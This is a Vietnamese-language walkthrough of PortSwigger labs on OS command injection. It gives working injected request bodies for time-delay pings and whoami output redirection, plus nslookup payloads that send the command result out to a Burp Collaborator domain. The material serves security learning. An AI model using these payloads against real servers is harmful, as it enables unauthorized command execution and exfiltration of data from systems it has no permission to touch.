# OS command injection

# **What is OS command injection?**

- **OS command injection** còn được gọi là **shell injection**. Nó cho phép kẻ tấn công thực thi các lệnh hệ điều hành (OS) trên máy chủ đang chạy ứng dụng và thường xâm phạm hoàn toàn ứng dụng và dữ liệu của ứng dụng.
- Kẻ tấn công thường có thể lợi dụng lỗ hổng **OS command injection** để xâm phạm các phần khác của cơ sở hạ tầng lưu trữ và khai thác các mối quan hệ tin cậy để chuyển hướng cuộc tấn công sang các hệ thống khác trong tổ chức.

# **Injecting OS commands**

- Các câu lệnh hữu ích
    
    
    | Linux | Windows |
    | --- | --- |
    | `whoami` | `whoami` |
    | `uname -a` | `ver` |
    | `ifconfig` | `ipconfig /all` |
    | `netstat -an` | `netstat -an` |
    | `ps -ef` | `tasklist` |

## **Lab: OS command injection, simple case**

- GUI web challenge
    
    ![image.png](/OS%20command%20injection/images/image.png)
    
- Bấm vào `View details` 1 product bất kỳ, trang web sẽ điều hướng tới chi tiết sản phẩm
    
    ![image.png](/OS%20command%20injection/images/image%201.png)
    
    → Bấm `Check stock` để xem phản hồi, quan sát trên burp
    
    ![image.png](/OS%20command%20injection/images/image%202.png)
    
- Thử 1 vài câu lệnh injection
    
    ![image.png](/OS%20command%20injection/images/image%203.png)
    
- Chỉ cần xem được tên người dùng là đã hoàn thành bài lab
    
    ![image.png](/OS%20command%20injection/images/image%204.png)
    

# **Blind OS command injection vulnerabilities**

- Blind OS Command Injection là một dạng tấn công mà kết quả của lệnh không hiển thị trực tiếp trên phản hồi HTTP. Điều này khiến việc khai thác khó khăn hơn, nhưng vẫn có thể thực hiện bằng các kỹ thuật khác.
- Ví dụ về **Blind OS command injection**
    - Giả sử một trang web có tính năng gửi phản hồi qua email. Ứng dụng phía server gọi lệnh `mail` để gửi email, như sau:
        
        ```
        mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
        ```
        
    - Nếu ứng dụng bị tấn công bằng OS command injection, nhưng phản hồi không hiển thị kết quả thực thi lệnh, hacker phải tìm cách khác để kiểm tra xem lệnh có chạy hay không.
- Kỹ thuật phát hiện **Blind OS command injection** bằng **Time Delay**
    - Một cách phổ biến là sử dụng **lệnh gây trễ thời gian**, chẳng hạn như `ping`:
        
        ```bash
        & ping -c 10 127.0.0.1 &
        ```
        
    - Lệnh này sẽ gửi 10 gói tin ICMP đến **localhost** (127.0.0.1), khiến server chờ 10 giây. Nếu ứng dụng mất thêm thời gian để phản hồi, chứng tỏ lệnh đã được thực thi, xác nhận lỗ hổng tồn tại.
- Khai thác **Blind OS command injection** bằng cách chuyển hướng đầu ra (**redirecting output)**
    - Nếu ứng dụng phục vụ tài nguyên tĩnh từ vị trí hệ thống tệp `/var/www/static`, có thể gửi đầu vào sau để bypass:
        
        ```bash
        & whoami > /var/www/static/whoami.txt &
        ```
        
    
    → Ký tự `>` gửi đầu ra từ lệnh **whoami** đến tệp đã chỉ định
    
- Khai thác **Blind OS command injection** bằng kỹ thuật ngoài bằng tần (**out-of-band)**
    - Sử dụng câu lệnh được chèn để kích hoạt tương tác mạng ngoài băng tần với hệ thống domain đang tương tác
        
        ```bash
        & nslookup `whoami`. [FAKE DOMAIN] &
        ```
        

## Lab: **Blind OS command injection with time delays**

- GUI web challenge
    
    ![image.png](/OS%20command%20injection/images/image%205.png)
    
    → Có một endpoint `Submit feedback`
    
    ![image.png](/OS%20command%20injection/images/image%206.png)
    
    - Thử nhập như bình thường và quan sát ở burp
    
    ![image.png](/OS%20command%20injection/images/image%207.png)
    
    ```bash
    csrf=eCxSKFNvgaHhjNvVBrfRonsY4eKF3Ag5&name=Jayce&email=jaycedang%40gmail.com&subject=IT&message=Hello
    ```
    
    → Thử sửa lại một chút payload `ping -c 10 127.0.0.1`
    
    ```bash
    csrf=eCxSKFNvgaHhjNvVBrfRonsY4eKF3Ag5&name=Jayce&email=jaycedang%[40gmail.com](http://40gmail.com/)||ping+-c+10+127.0.0.1||&subject=IT&message=Hello
    ```
    
    - Response vẫn trả về `200 OK` nhưng mất 1 khoảng ~ 10s để nhận được. Khả năng cao câu lệnh payload đã được thực thi
    
    ```bash
    ping+-c+10+127.0.0.1
    ```
    
    ![image.png](/OS%20command%20injection/images/image%208.png)
    
    - Như vậy là đã hoàn thành lab
    
    ![image.png](/OS%20command%20injection/images/image%209.png)
    

## **Lab: Blind OS command injection with output redirection**

- GUI web challenge
    
    ![image.png](/OS%20command%20injection/images/image%2010.png)
    
- Check vuln tại `endpoint` **Submit feedback**
    
    ![image.png](/OS%20command%20injection/images/image%2011.png)
    
    - Các `endpoint` tại **/image**
        
        ![image.png](/OS%20command%20injection/images/image%2012.png)
        
- Nhập thử thông tin rồi Submit, sau đó xem trên `Burp Repeater`
    
    ![image.png](/OS%20command%20injection/images/image%2013.png)
    
- Thử sửa lại payload để check blind OS injection `sleep 10 #`
    
    ```bash
    +%26+sleep+10+%23
    ```
    
    ![image.png](/OS%20command%20injection/images/image%2014.png)
    
- Thử thực thi câu lệnh `whoami` sau đó truy xuất thông tin qua tệp `/var/www/images/output.txt` bằng ký tự `>`
    
    → `& whoami> /var/www/images/output.txt #`
    
    ```bash
    +%26+whoami>+/var/www/images/output.txt+%23
    ```
    
    ![image.png](/OS%20command%20injection/images/image%2015.png)
    
- Get lại tại `endpoint` **GET /image?filename=** nhưng thay bằng tệp output.txt
    
    ![image.png](/OS%20command%20injection/images/image%2016.png)
    
    → `peter-8Ltz5o`
    
    - Như vậy là đã hoàn thành bài lab
    
    ![image.png](/OS%20command%20injection/images/image%2017.png)
    

## **Lab: Blind OS command injection with out-of-band interaction**

- GUI web challenge
    
    ![image.png](/OS%20command%20injection/images/image%2018.png)
    
- Dùng thử tính năng submit feedback
    
    ![image.png](/OS%20command%20injection/images/image%2019.png)
    
- Sử dụng burp tạo fake domain [`zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com`](http://zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com/) . Sau đó gửi payload
    
    ```bash
    csrf=sGbFdDJXpZP2fKqkcOPH1t2WGfVm4x6I&name=jayce&email=jaycedang%40gmail.com||nslookup+x.zil20vjhuz35l96nvcg3o61uxl3cr2fr.oastify.com||&subject=IT&message=Hello
    ```
    
    ![image.png](/OS%20command%20injection/images/image%2020.png)
    
    → Máy chủ đích nếu thực thi lệnh này, nó sẽ gửi yêu cầu DNS đến `oastify.com`, một dịch vụ dùng để phát hiện yêu cầu từ xa. Attacker có thể theo dõi xem truy vấn có được thực thi hay không.
    
    - Như vậy là đã hoàn thành bài lab
    
    ![image.png](/OS%20command%20injection/images/image%2021.png)
    

## **Lab: Blind OS command injection with out-of-band data exfiltration**

- GUI web challenge
    
    ![image.png](/OS%20command%20injection/images/image%2022.png)
    
- Tiến hành khai thác tại endpoint `Submit feedback`
    
    ![image.png](/OS%20command%20injection/images/image%2023.png)
    
- Sử dụng Burp [Collabrator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) để lấy thông tin fake domain, sau đó tiến hành payload
    
    ```bash
    csrf=juthtTChOc8nA7hY3xWVVvGvWjXnpZgt&name=jayce&email=||nslookup+`whoami`.qoi5knhj9ginkzn4op9193anmes5gw4l.oastify.com||&subject=IT&message=Hello
    ```
    
    ![image.png](/OS%20command%20injection/images/image%2024.png)
    
- Quay lại Burp [Collabrator](https://portswigger.net/burp/documentation/desktop/tools/collaborator), thực hiện poll
    
    ![image.png](/OS%20command%20injection/images/image%2025.png)
    
    → Thông tin `peter-zM9peT` trả về từ câu lệnh payload `whoami`. Submit lên trang web.
    
    - Như vậy là hoàn thành bài lab

    ![image.png](/OS%20command%20injection/images/image%2026.png)